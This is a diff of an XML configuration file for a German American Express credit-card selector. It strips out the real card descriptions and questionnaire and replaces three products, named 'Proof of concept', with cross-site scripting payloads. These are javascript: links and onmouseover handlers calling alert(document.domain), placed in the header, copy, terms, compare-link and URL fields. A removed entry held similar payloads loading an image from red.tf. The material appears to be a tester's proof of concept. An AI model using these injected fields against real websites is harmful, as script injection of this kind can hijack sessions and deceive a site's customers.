@@ -42,87 +42,11 @@
          	<apply_now><![CDATA[Jetzt beantragen]]></apply_now>
 	<loading><![CDATA[Lade]]></loading>
 	<more_features><![CDATA[Vorteile der Karte]]></more_features>
-	<options>
-		 <option id="1">
-        		  	<title><![CDATA[Klassische Karten]]></title>
-        		  	<copy><![CDATA[]]></copy>
-			<showcards>1,2,4,5,9</showcards>
-		 </option>
-       		 <option id="2">
-         	 	  	<title><![CDATA[Affinity & CoBrand Karten]]></title>
-         	 	  	<copy><![CDATA[]]></copy>
-         	 	  	<showcards>7,8</showcards>
-	 	</option>
- 		<option id="3">
-         	 	  	<title><![CDATA[Alle Karten]]></title>
-         	 	  	<copy><![CDATA[]]></copy>
-         	 	  	<showcards>1,2,4,5,9,7,8</showcards>
-	 	</option>
-	 </options>
-      </section>
-      <section id="1">
-         	<title><![CDATA[Karten vergleichen]]></title>
-         	<apply_now><![CDATA[Jetzt beantragen]]></apply_now>
-	<choose_another><![CDATA[Andere Karte auswählen]]></choose_another>
-	<loading><![CDATA[Lade]]></loading>
-	<more_features><![CDATA[Vorteile der Karte]]></more_features>
-	<options>
-		<option id="1">
-        		 	<title><![CDATA[Klassische Karten]]></title>
-        		 	<copy><![CDATA[]]></copy>
-			<showcards>1,2,4</showcards>
- 			<allcards>1,2,4,5,9</allcards>    
-		 </option>
-       		 <option id="2">
-         	 		<title><![CDATA[Affinity & CoBrand Karten]]></title>
-         	 		<copy><![CDATA[]]></copy>
-         	 		<showcards>7,8</showcards>
-			<allcards>7,8</allcards>
-	 	 </option>
-		<option id="3">
-         	 	  	<title><![CDATA[Alle Karten]]></title>
-         	 	  	<copy><![CDATA[]]></copy>
-         	 	  	<showcards>1,2,7</showcards>
-  			<allcards>1,2,4,5,7,8,9</allcards>
-	 	</option>
-	 </options>  
       </section>
       <section id="2">
          <title><![CDATA[Hilfe bei der Kartenwahl]]></title>
 	 <heading><![CDATA[Beantworten Sie die nachfolgenden vier Fragen. Dann sagen wir Ihnen, welche Karte am besten zu Ihnen passt.]]></heading>
-	 <questionnaire>
-			<question id="fone">
-				<title><![CDATA[Welche Angebote sind für Sie am wichtigsten?]]></title>
-				<option id="0"><![CDATA[Attraktive Einkaufsangebote bei unseren Partnern]]></option>
-				<option id="1"><![CDATA[Besondere Angebote von Fluggesellschaften und/oder Hotels]]></option>
-				<option id="2"><![CDATA[Vergünstigungen bei Autovermietungen]]></option>
-				<option id="3"><![CDATA[Kostenfreier Zugang zu Flughafen Lounges]]></option>
-				<option id="4"><![CDATA[Umsatzabhängige Jahresgebühr]]></option>
-			</question>
-			<question id="ftwo">
-				<title><![CDATA[Welche Versicherungsleistung zählt für Sie am meisten?]]></title>
-				<option id="0"><![CDATA[Schutz bei Kartenmissbrauch, on- & offline]]></option>
-				<option id="1"><![CDATA[Erweitertes Rückgaberecht / Versicherung gekaufter Waren]]></option>
-				<option id="2"><![CDATA[Schutz bei Verlust von Schlüsseln und Dokumenten]]></option>
-				<option id="3"><![CDATA[Kfz-Schutzbrief]]></option>
-				<option id="4"><![CDATA[Auslandsreisekrankenversicherung]]></option>
-				<option id="5"><![CDATA[Mietwagenhaftpflicht- und Vollkaskoversicherung]]></option>
-			</question>
-			<question id="fthree">
-				<title><![CDATA[Welche Serviceleistungen sind für Sie am wichtigsten?]]></title>
-				<option id="0"><![CDATA[Persönlicher 24h Telefonservice, weltweit]]></option>
-				<option id="1"><![CDATA[Zusätzlicher telefonischer Reise-Service]]></option>
-				<option id="2"><![CDATA[Zusätzlicher Lifestyle- und Event-Service]]></option>
-			</question>
-			<question id="ffour">
-				<title><![CDATA[Welches Brutto Jahreseinkommen haben Sie in etwa?]]></title>
-				<option id="0"><![CDATA[Weniger als 23,000 €]]></option>
-				<option id="1"><![CDATA[Zwischen 23,000 € und 28,000 €]]></option>
-				<option id="2"><![CDATA[Zwischen 28,000 € und 40,000 €]]></option>
-				<option id="3"><![CDATA[Zwischen 40,000 € und 60,000 €]]></option>
-				<option id="4"><![CDATA[Mehr als 60,000 €]]></option>
-			</question>
-	 </questionnaire>
+
  	<loading><![CDATA[Lade]]></loading>	
 	 <submit_label><![CDATA[Karte anzeigen]]></submit_label>
 	 <submit_message><![CDATA[Bitte beachten Sie, dass Sie alle Fragen beantwortet haben.]]></submit_message>
@@ -140,351 +64,47 @@
       </section>
    </sections>
    <products>
-     			<product id="1" image_use_url="1">
-					<name>Die Blue Card</name>
-					<image>http://red.tf/sample.png</image>
-					<image_small>http://red.tf/sample.png</image_small>
-					<info>
-						<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><svg onload='javascript:alert(document.domain)'></svg><img src='x' onload='javascript:alert(document.domain)'></img>]]></header>
-						<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><svg onload='javascript:alert(document.domain)'></svg><img src='x' onload='javascript:alert(document.domain)'></img>]]></copy>
-						<bullets>
-							<bullet><![CDATA[Im 1. Jahr kostenlos]]></bullet>
-							<bullet><![CDATA[Ab € 3.500,- Jahresumsatz auch im Folgejahr kostenlos ]]></bullet>		
-							<bullet><![CDATA[Schutz vor Missbrauch – auch im Internet]]></bullet>
-							<bullet><![CDATA[Service rund um die Uhr]]></bullet>												</bullets>
-						<tctitle><![CDATA[Die Blue Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><svg onload='javascript:alert(document.domain)'></svg><img src='x' onload='javascript:alert(document.domain)'></img>]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Im 1. Jahr kostenlos]]></bullet>
-							<bullet><![CDATA[Ab € 3.500,- Jahresumsatz auch im Folgejahr kostenlos]]></bullet>
-							<bullet><![CDATA[Schutz vor Missbrauch – auch im Internet]]></bullet>
-						</copy>
-						<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
-					</features>					
-<url><![CDATA[javascript:alert(document.domain)]]></url>
-			</product>
+ 			<product id="1" image_use_url="1">
+				<name>Proof of concept</name>
+				<image>jpg/large/LRG_DE_personal.jpg</image>
+				<image_small>jpg/small/sml_DE_green.jpg</image_small>
+				<info>
+					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
+					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
+					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
+				</info>
+				<features>
+					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
+				</features>
+				<url><![CDATA[javascript:alert(document.domain)]]></url>
+		</product>
 			<product id="2" image_use_url="1">
-					<name>Die American Express Card</name>
-					<image>jpg/large/LRG_DE_personal.jpg</image>
-					<image_small>jpg/small/sml_DE_green.jpg</image_small>
-					<info>
-						<header><![CDATA[Der Klassiker unter den American Express Karten! Sie sind im Rahmen Ihrer finanziellen Möglichkeiten unbegrenzt flexibel und außerdem bei missbräuchlichem Einsatz Ihrer Karte geschützt.]]></header>
-						<copy><![CDATA[Mit unserem Bonusprogramm Membership Rewards® sammeln Sie wertvolle Punkte für attraktive Prämien – jedes Mal, wenn Sie Ihre Karte einsetzen.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.]]></copy>
-						<bullets>
-							<bullet><![CDATA[Erweitertes Rückgaberecht für Ihre Einkäufe]]></bullet>
-							<bullet><![CDATA[Versicherung gekaufter Waren]]></bullet>		
-							<bullet><![CDATA[Schutz bei Kartenmissbrauch]]></bullet>
-							<bullet><![CDATA[Kein vorgegebenes Ausgabenlimit]]></bullet>
-							<bullet><![CDATA[Service rund um die Uhr]]></bullet>
-							<bullet><![CDATA[Jahresgebühr: € 55,-]]></bullet>
-						</bullets>
-						<tctitle><![CDATA[Die American Express Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Erweitertes Rückgaberecht für Ihre Einkäufe]]></bullet>		
-							<bullet><![CDATA[Versicherung gekaufter Waren]]></bullet>	
-							<bullet><![CDATA[Schutz bei Kartenmissbrauch]]></bullet>	
-						</copy>		<comparelink><![CDATA[http://www.americanexpress.com/germany/personal/cards/apply/cards.shtml]]></comparelink>
-					</features>	
-<url><![CDATA[script_eapp.cgi?prod_name=deu_green]]></url>
+					<name>Proof of concept</name>
+				<image>jpg/large/LRG_DE_personal.jpg</image>
+				<image_small>jpg/small/sml_DE_green.jpg</image_small>
+				<info>
+					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
+					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
+					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
+				</info>
+				<features>
+					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
+				</features>
+				<url><![CDATA[javascript:alert(document.domain)]]></url>
 			</product>
 			<product id="3" image_use_url="1">
-					<name>Die Aurum Card</name>
-					<image>jpg/large/LRG_DE_aurum.jpg</image>
-					<image_small>jpg/small/sml_DE_aurum.jpg</image_small>
-					<info>
-						<header><![CDATA[Die Karte für Service und Sicherheit: Wir bieten Ihnen schnelle und unkomplizierte Hilfe, wenn mal etwas verloren geht – ob Kreditkarten, Schlüssel oder Dokumente. Ein einziger Anruf genügt!]]></header>
-						<copy><![CDATA[Mit unserem Bonusprogramm Membership Rewards® sammeln Sie wertvolle Punkte für attraktive Prämien – jedes Mal, wenn Sie Ihre Karte einsetzen.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.]]></copy>
-						<bullets>
-							<bullet><![CDATA[Ab € 5.000,- Jahresumsatz beitragsfrei]]></bullet>				
-							<bullet><![CDATA[Hilfe bei Karten-, Dokumenten- & Schlüsselverlust]]></bullet>
-							<bullet><![CDATA[Erweitertes Rückgaberecht für Ihre Einkäufe]]></bullet>
-							<bullet><![CDATA[Versicherung gekaufter Waren]]></bullet>
-							<bullet><![CDATA[Kein vorgegebenes Ausgabenlimit]]></bullet>					
-							<bullet><![CDATA[Service rund um die Uhr]]></bullet>
-						</bullets>
-						<tctitle><![CDATA[Die Aurum Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Ab € 5.000,- Jahresumsatz beitragsfrei]]></bullet>
-							<bullet><![CDATA[Hilfe bei Karten-, Dokumenten- & Schlüsselverlust]]></bullet>		
-							<bullet><![CDATA[Erweitertes Rückgaberecht für Ihre Einkäufe]]></bullet>		
-						</copy>					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,22062,00.asp]]></comparelink>
+					<name>Proof of concept</name>
+				<image>jpg/large/LRG_DE_personal.jpg</image>
+				<image_small>jpg/small/sml_DE_green.jpg</image_small>
+				<info>
+					<header><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></header>
+					<copy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></copy>
+					<tccopy><![CDATA[<a href='javascript:alert(document.domain)'>Click me</a><b onmouseover='javascript:alert(document.domain)'>Over me</b>]]></tccopy>
+				</info>
+				<features>
+					<comparelink><![CDATA[javascript:alert(document.domain)]]></comparelink>
 				</features>
-<url><![CDATA[script_eapp.cgi?prod_name=deu_gold]]></url>
-			</product>
-			<product id="4" image_use_url="1">
-					<name>Die Gold Card</name>
-					<image>jpg/large/LRG_DE_goldcardzuc.jpg</image>
-					<image_small>jpg/small/sml_DE_gold.jpg</image_small>
-					<info>
-						<header><![CDATA[Die Karte für Menschen, die mehr erwarten und mobil sind. Der Gold Card Reise-Service übernimmt für Sie nicht nur Ihre Reiseplanung, sondern hält für Sie auch attraktive Angebote bereit.]]></header>
-						<copy><![CDATA[Außerdem enthält die Gold Card ein umfangreiches Versicherungspaket mit Kfz-Schutzbrief und Auslandsreise-Krankenversicherung.<br><br>Mit unserem Bonusprogramm Membership Rewards® sammeln Sie wertvolle Punkte für attraktive Prämien – jedes Mal, wenn Sie Ihre Karte einsetzen.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.]]></copy>
-						<bullets>
-							<bullet><![CDATA[Gold Card Reise-Service]]></bullet>				
-							<bullet><![CDATA[KFZ-Schutzbrief]]></bullet>
-							<bullet><![CDATA[Auslandsreise Krankenversicherung]]></bullet>
-							<bullet><![CDATA[Kein vorgegebenes Ausgabenlimit]]></bullet>
-							<bullet><![CDATA[Service rund um die Uhr]]></bullet>													<bullet><![CDATA[Jahresgebühr: € 110,- ]]></bullet>		
-						</bullets>
-						<tctitle><![CDATA[Die Gold Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Gold Card Reise-Service]]></bullet>	
-							<bullet><![CDATA[KFZ-Schutzbrief]]></bullet>	
-							<bullet><![CDATA[Auslandsreise Krankenversicherung]]></bullet>	
-						</copy>
-						<comparelink><![CDATA[http://www212.americanexpress.com/dsmlive/dsm/int/de/de/personal/ourcards/allcards/goldcard_cm.do?vgnextoid=f784853b43825110VgnVCM100000cef4ad94RCRD]]></comparelink>
-					</features>
-					<url><![CDATA[script_eapp.cgi?prod_name=germany_gold]]></url>
-		</product>
-		<product id="5" image_use_url="0">
-					<name>Die Platinum Card</name>
-					<image>jpg/large/GER_PES_Plat_new_card_large-110406.jpg</image>
-					<image_small>jpg/small/GER_PES_Plat_new_card_small-110406.jpg</image_small>
-					<info>
-						<header><![CDATA[Die Platinum Card bietet ein komplettes Servicepaket für Sie und Ihre Lieben: Bis zu 5 Partnerkarten sind inklusive. Der Platinum Card Service hilft Ihnen Zeit zu sparen und nimmt rund um die Uhr Ihre Wünsche und Aufträge entgegen.]]></header>
-
-						<copy><![CDATA[Den ausgewählten Platinum Mitgliedern stehen Reisebüro- und Lifestyle-Service, Mietwagen-Vollkasko-Versicherung, kostenfreier Zugang zu Flughafen Lounges und vieles mehr zur Verfügung.<br><br>Mit unserem Bonusprogramm Membership Rewards® sammeln Sie wertvolle Punkte für attraktive Prämien – jedes Mal, wenn Sie Ihre Karte einsetzen.]]></copy>
-						<bullets>
-							<bullet><![CDATA[Platinum Card Reise-Service]]></bullet>				
-							<bullet><![CDATA[Mietwagen Vollkasko Versicherung]]></bullet>
-							<bullet><![CDATA[Freier Zugang zu Airport-Lounges]]></bullet>
-							<bullet><![CDATA[Lifestyle-Service]]></bullet>
-							<bullet><![CDATA[Partnerkarten inklusive]]></bullet>
-							<bullet><![CDATA[Jahresgebühr: € 500,-]]></bullet>						
-						</bullets>
-						<tctitle><![CDATA[Die Platinum Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Platinum Card Reise-Service]]></bullet>
-							<bullet><![CDATA[Lifestyle-Service]]></bullet>
-							<bullet><![CDATA[Freier Zugang zu Airport-Lounges]]></bullet>
-						</copy>
-						<comparelink><![CDATA[ https://www298.americanexpress.com/platinum/de/de/login.do]]></comparelink>
-					</features>
-					<url><![CDATA[http://www.amexplatinum.de/aktion/amexplatinum/einladung.php]]></url>
-		</product>
-			<product id="6" image_use_url="1">
-					<name>Die Compliment Card</name>
-					<image>jpg/large/LRG_DE_compliment.jpg</image>
-					<image_small>jpg/small/sml_DE_compliment.jpg</image_small>
-					<info>
-						<header><![CDATA[Exklusive Vorteile und Privilegien in den Accor Hotels – Sofitel, Dorint, Mercure und Novotel. Egal, ob Sie beruflich oder privat unterwegs sind. Zusätzlich zu allen Leistungen der American Express Card.]]></header>
-						<copy><![CDATA[In unserem Bonusprogramm Membership Rewards® punkten Sie gleich dreifach: Mit der Compliment Card sammeln Sie in allen Häusern der Accor Gruppe für 2 Euro Umsatz 3 Punkte.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.]]></copy>						
-						<bullets>
-							<bullet><![CDATA[Kein Ausgabenlimit]]></bullet>			
-							<bullet><![CDATA[Reiseversicherung]]></bullet>						
-							<bullet><![CDATA[Erleichtertes Check-in]]></bullet>
-							<bullet><![CDATA[Jahresgebühr: € 18,- im 1. Jahr, später € 36,-]]></bullet>
-						</bullets>
-						<tctitle><![CDATA[Die Compliment Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Spezielle Angebote in allen Häusern der Accor Gruppe]]></bullet>	
-							<bullet><![CDATA[Keine Formalitäten beim Ein- und Auschecken]]></bullet>	
-							<bullet><![CDATA[Late Check-Out am Wochenende]]></bullet>	
-						</copy>
-						<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14922,00.asp]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_comlimentcard.pdf]]></url>
-			</product>
-			<product id="7" image_use_url="1">
-					<name>Die Douglas Premium Card </name>
-					<image>jpg/large/LRG_DE_dug.jpg</image>
-					<image_small>jpg/small/sml_DE_douglas.jpg</image_small>
-					<info>
-						<header><![CDATA[Die optimale Verbindung einer exklusiven Beauty Card mit den Service-Leistungen von American Express für nur € 50,- im Jahr: Bargeldloses Zahlen weltweit ohne Ausgabenlimit, Gutscheine zu besonderen Anlässen und spezielle Angebote bei Douglas.]]></header>
-						<copy><![CDATA[Mit unserem Bonusprogramm Membership Rewards® Classic sammeln Sie wertvolle Punkte für attraktive Prämien – jedes Mal, wenn Sie Ihre Karte einsetzen.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.]]></copy>				
-						<bullets>
-							<bullet><![CDATA[Bargeldloses Bezahlen weltweit, ohne Limit]]></bullet>			
-							<bullet><![CDATA[Bonusprogramm Membership Rewards Classic]]></bullet>			
-							<bullet><![CDATA[Geburtstagsgutschein über € 10,- und Neujahrs-Gutschein über € 15,-]]></bullet>	
-							<bullet><![CDATA[Online-Einkauf bei Douglas ohne Versandkosten]]></bullet>
-							<bullet><![CDATA[Douglas Premium Mailings]]></bullet>
-							<bullet><![CDATA[Shop Garant]]></bullet>
-						</bullets>
-						<tctitle><![CDATA[Die Douglas Premium Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Geburtstag- und Neujahrs-Gutschein]]></bullet>
-							<bullet><![CDATA[Spezielle Douglas Beauty Spa-Angebote]]></bullet>
-							<bullet><![CDATA[Exklusive limitierte Douglas-Produktangebote]]></bullet>
-						</copy>
-						<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,22163,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_premiumcard.pdf]]></url>
-			</product>
-			<product id="8" image_use_url="1">
-					<name>Die Sixt Card</name>
-					<image>jpg/large/LRG_DE_sixT.jpg</image>
-					<image_small>jpg/small/Sixt_Card_Gold_for_card_sel.jpg</image_small>
-					<info>
-						<header><![CDATA[Für alle, die viel unterwegs sind: Satte Rabatte bei Sixt, Rückerstattung der Jahresgebühr und sicheres Bezahlen online und offline ohne Ausgabenlimit. Weitere Vorteile gibt es für alle Mitglieder der Sixt Gold Card.]]></header>
-						<copy><![CDATA[Bei unserem Membership Rewards Programm® punkten Sie gleich doppelt – jedes Mal, wenn Sie mit Ihrer Karte bezahlen.<br><br>Der American Express Service ist immer für Sie da. Weltweit 24 Stunden am Tag, 7 Tage die Woche. Telefonisch oder übers Internet.
-]]></copy>
-						<bullets>
-							<bullet><![CDATA[Bis zu 35% Rabatt auf Mietwagen]]></bullet>			
-							<bullet><![CDATA[Kein Ausgabenlimit]]></bullet>						
-							<bullet><![CDATA[Schutz gegen Missbrauch]]></bullet>
-							<bullet><![CDATA[Rückerstattung der Jahres-Gebühren durch Sixt]]></bullet>		
-						</bullets>
-						<tctitle><![CDATA[Die Sixt Card Mitgliedschaftsbedingungen]]></tctitle>
-						<tccopy><![CDATA[]]></tccopy>
-					</info>
-					<features>
-						<copy>
-							<bullet><![CDATA[Rückerstattung der Jahresgebühr*]]></bullet>
-							<bullet><![CDATA[Bis zu 35% Rabatt auf Mietwagen]]></bullet>		
-							<bullet><![CDATA[Doppelte Membership Rewards Punkte*</li><br>  * Weitere Information unter „Vorteile der Karte“]]></bullet>	
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14920,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_sixtcard.pdf]]></url>
-			</product>
-			<product id="9" image_use_url="0">
-					<name>Die Centurion Card</name>
-					<image>jpg/large/LRG_DE_centruin.jpg</image>
-					<image_small>jpg/small/sml_DE_centurion.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Individueller Concierge-Service]]></bullet>
-							<bullet><![CDATA[Freier Zugang zu Airport-Lounges]]></bullet>		
-							<bullet><![CDATA[Umfangreiches Versicherungspaket…]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,10732,00.asp]]></comparelink>
-					</features>
-					<url><![CDATA[]]></url>
-					<recommendation_url ><![CDATA[]]></recommendation_url>
-			</product>
-			<product id="10" image_use_url="1">
-					<name>Die Golf Card</name>
-					<image>jpg/large/LRG_DE_golf.jpg</image>
-					<image_small>jpg/small/sml_DE_golf.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Green Fee-Vergünstigungen]]></bullet>
-							<bullet><![CDATA[Hole in one-Versicherung bis EUR 500,-]]></bullet>		
-							<bullet><![CDATA[Zugang zu Golf Card Events]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www212.americanexpress.com/dsmlive/dsm/int/de/de/personal/ourcards/allcards/golfcard_cm.do?vgnextoid=e335853b43825110VgnVCM100000cef4ad94RCRD]]></comparelink>
-					</features>
-		<url><![CDATA[https://www10.americanexpress.com/Germany_ss/Germany_conssvcs_Alle_Karten_ss/PDFs/Golf_Card_Online_Basic_04.pdf]]></url>
-			</product>			
-			<product id="11" image_use_url="1">
-					<name>Die WWF Card</name>
-					<image>jpg/large/LRG_DE_wwf.jpg</image>
-					<image_small>jpg/small/sml_DE_wwf.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Jeder Einsatz der Karte unterstützt die WWF Projektarbeit]]></bullet>
-							<bullet><![CDATA[EUR 3,- Ihrer ersten Jahresgebühr fließen direkt an den WWF]]></bullet>		
-							<bullet><![CDATA[Nur EUR 20,- Jahresgebühr im ersten Jahr]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14923,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_wwfcard.pdf]]></url>
-			</product>
-			
-			<!--
-			<product id="12" image_use_url="1">
-					<name>Die Jaguar Gold Card</name>
-					<image>jpg/large/LRG_DE_jaggold.jpg</image>
-					<image_small>jpg/small/sml_DE_jaggold.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Komplette Reiseplanung auf Anruf]]></bullet>
-							<bullet><![CDATA[Umfangreiches Versicherungspaket]]></bullet>		
-							<bullet><![CDATA[Kostenlose Ersatzkarte]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14924,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_jaguargoldcard.pdf]]></url>
-
-			</product>
-			-->
-			<!--<product id="13" image_use_url="1">
-					<name>Die MotoGP Card</name>
-					<image>jpg/large/LRG_DE_motogp.jpg</image>
-					<image_small>jpg/small/sml_DE_motorgp.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Miniabos für Motorrad, PS u. Motorsport aktuell]]></bullet>
-							<bullet><![CDATA[Kein vorgegebenes Ausgabelimit]]></bullet>		
-							<bullet><![CDATA[ShopGarant Einkaufsversicherung]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14925,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenatrag_motogpcard.pdf]]></url>
-			</product>-->			
-			<product id="14" image_use_url="1">
-					<name>Die Feuerwehrkarte</name>
-					<image>jpg/large/LRG_DE_feuerwehr.jpg</image>
-					<image_small>jpg/small/sml_DE_fuerer.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Besondere Angebote beim Versandhaus des Deutschen Feuerwehrverbandes]]></bullet>
-							<bullet><![CDATA[Bevorzugter Eintritt im deutschen Feuerwehrmuseum in Fulda]]></bullet>													<bullet><![CDATA[Verkehrsmittel-Unfallversicherung]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14929,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_feuerwehrkarte.pdf]]></url>
-			</product>			
-			<product id="15" image_use_url="1">
-					<name>Die Jägerkarte</name>
-					<image>jpg/large/LRG_DE_jaegerkarte.jpg</image>
-					<image_small>jpg/small/sml_DE_jaegerkerht.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Vorzugspreise für das DJV Handbuch]]></bullet>
-							<bullet><![CDATA[Kostenloses Probeabonnements]]></bullet>		
-							<bullet><![CDATA[Regelmäßige Verlosung von Jagdeinladungen]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14927,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_jaegerkarte.pdf]]></url>
-			</product>			
-			<product id="16" image_use_url="1">
-					<name>Die Pride Card</name>
-					<image>jpg/large/LRG_DE_pride.jpg</image>
-					<image_small>jpg/small/sml_DE_pride.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Rabatte bei Mainhatten Sports und AMIGA Frauenfitness Studios in Frankfurt]]></bullet>
-							<bullet><![CDATA[Vorteile in allen Lifestyle Studios der Fitness Company]]></bullet>		
-							<bullet><![CDATA[Nur EUR 18,- Jahresgebühr im ersten Jahr]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www10.americanexpress.com/sif/cda/page/0,1641,14928,00.asp?]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_pridecard.pdf]]></url>
-			</product>			
-			<product id="17" image_use_url="1">
-					<name>Die Reiterkarte</name>
-					<image>jpg/large/LRG_DE_reiterkarte.jpg</image>
-					<image_small>jpg/small/sml_DE_reiter.jpg</image_small>
-					<features>
-						<copy>
-							<bullet><![CDATA[Besondere Angebote und Aktionen beim FNverlag der Deutschen Reiterlichen Vereinigung]]></bullet>
-							<bullet><![CDATA[ShopGarant Einkaufsversicherung]]></bullet>		
-							<bullet><![CDATA[Halbe Jahresgebühr im ersten Jahr: EUR 18,-]]></bullet>		
-						</copy>
-					<comparelink><![CDATA[http://www212.americanexpress.com/dsmlive/dsm/int/de/de/personal/ourcards/allcards/ridercard_cm.do?vgnextoid=a545853b43825110VgnVCM100000cef4ad94RCRD]]></comparelink>
-					</features>
-					<url   ><![CDATA[http://www10.americanexpress.com/Germany_ss/Germany_Conssvcs_Alle_Karten_ss/PDFs/kartenantrag_reiterkarte.pdf]]></url>
+				<url><![CDATA[javascript:alert(document.domain)]]></url>
 			</product>
 	</products>
 </PESCardSelector>
